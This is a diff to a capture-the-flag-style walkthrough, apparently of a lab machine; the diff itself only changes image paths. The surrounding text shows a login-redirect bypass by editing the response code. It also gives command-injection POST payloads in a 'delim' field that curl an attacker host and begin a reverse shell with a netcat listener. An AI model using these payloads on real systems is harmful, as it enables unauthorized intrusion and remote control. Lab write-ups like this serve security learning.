@@ -49,10 +49,10 @@ We find some interesting pages that redirect to `login.php`. Let's try Intercept
 The website doesn't redirect us immediately, it rather loads the page and then redirects. We can abuse this and tamper with the response code. Changing the response to "200 OK" 
 we can bypass the redirection and access the website directly!
 
-![[Pasted image 20211224032506.png]]
+![[images/Pasted image 20211224032506.png]]
 
 And we are in!
-![[Pasted image 20211224032556.png]]
+![[images/Pasted image 20211224032556.png]]
 
 We can now try creating a user to have permanent access to the website.
 
@@ -79,7 +79,7 @@ Proving we have RCE:
 Intercepting the Submit request and using Repeater to do multiple requests, change the POST data `delim=comma+%26%26+curl+http%3a//10.10.14.2%3a8888`. When the code in `logs.php` executes this will trigger a GET request on my machine.
 A `nc` listener was already running on my machine on port 8888: 
 
-![[Pasted image 20211224033548.png]]
+![[images/Pasted image 20211224033548.png]]
 
 Since we got a GET request from the website, it meas we have executed code on the remote machine!
 
@@ -89,7 +89,7 @@ POST Data: `delim=comma+%26%26+export+RHOST%3d"10.10.14.2"%3bexport+RPORT%3d4444
 
 A Netcat Listener needs to be setup and listen to the specified port.
 
-![[Pasted image 20211224035728.png]]
+![[images/Pasted image 20211224035728.png]]
 
 ### 3.) Getting User
 
